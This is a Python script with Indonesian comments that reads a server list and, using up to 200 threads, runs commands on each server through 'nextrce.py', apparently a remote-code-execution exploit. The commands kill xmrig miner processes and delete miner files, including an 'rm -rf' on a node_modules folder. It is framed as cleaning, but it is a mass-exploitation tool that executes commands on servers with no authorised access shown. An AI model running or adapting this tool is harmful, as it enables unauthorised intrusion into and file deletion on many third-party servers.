import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

SITELIST = "z.txt"
MAX_THREADS = 200  # Bisa sesuaikan, misal 20-50 untuk 1000 server

# Command untuk bersihin miner
CLEAN_COMMANDS = [
    "pkill -9 -f xmrig",
    "rm -f xmrig config.json config-background.json xmrig.log",
    "rm -rf node_modules/xmrig config.json config-background.json xmrig.log",
]

def run_remote(url, cmd):
    """Jalankan command di server via nextrce.py"""
    try:
        process = subprocess.run(
            ["python3", "nextrce.py", "-u", url, "-c", cmd],
            capture_output=True,
            text=True,
            timeout=120
        )
        return process.stdout + process.stderr
    except Exception as e:
        return str(e)

def clean_server(url):
    """Bersihkan miner di satu server"""
    print(f"\n[+] Cleaning {url}")
    results = []

    for cmd in CLEAN_COMMANDS:
        output = run_remote(url, cmd)
        results.append((cmd, output))
    
    print(f"[✓] Done cleaning {url}")
    return url, results

# ======================
# Load server list
# ======================
with open(SITELIST, "r") as f:
    sites = [line.strip() for line in f if line.strip()]

# ======================
# Multithread execution
# ======================
all_results = []

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    future_to_url = {executor.submit(clean_server, url): url for url in sites}

    for future in as_completed(future_to_url):
        url = future_to_url[future]
        try:
            url, result = future.result()
            all_results.append((url, result))
        except Exception as e:
            print(f"[!] Error cleaning {url}: {e}")

print("\n=== SEMUA SERVER SUDAH DIBERSIHKAN ===")
